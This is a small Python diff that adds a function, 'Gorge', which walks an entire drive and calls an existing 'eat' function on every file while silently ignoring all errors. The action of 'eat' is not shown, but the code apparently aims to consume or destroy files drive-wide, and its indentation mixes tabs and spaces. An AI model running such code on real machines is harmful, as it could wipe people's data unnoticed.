@@ -11,3 +11,12 @@ def eat(path):
             print ("This file is not a regular file")
     else:
         print ("path doesnt exist")
+
+def Gorge(abs_drive):
+    for root, dirs, files in os.walk(abs_drive):
+        for name in files:
+                try:
+                	t = os.path.join(root,name)
+                    eat(t)
+                except:
+                        pass
